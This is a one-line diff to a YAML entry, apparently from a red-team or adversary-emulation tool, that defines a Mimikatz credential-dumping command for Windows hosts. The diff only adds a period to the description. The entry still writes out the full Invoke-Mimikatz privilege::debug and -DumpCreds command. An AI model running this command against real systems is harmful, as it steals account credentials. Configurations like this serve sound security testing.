@@ -3,4 +3,4 @@ mimikatz_dumpcreds:
   filename: "Invoke-Mimikatz.ps1"
   command: 'Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds'
   type: "windows"
-  description: "Dumps credentials from a windows host. Requires admin privileges"
+  description: "Dumps credentials from a windows host. Requires admin privileges."
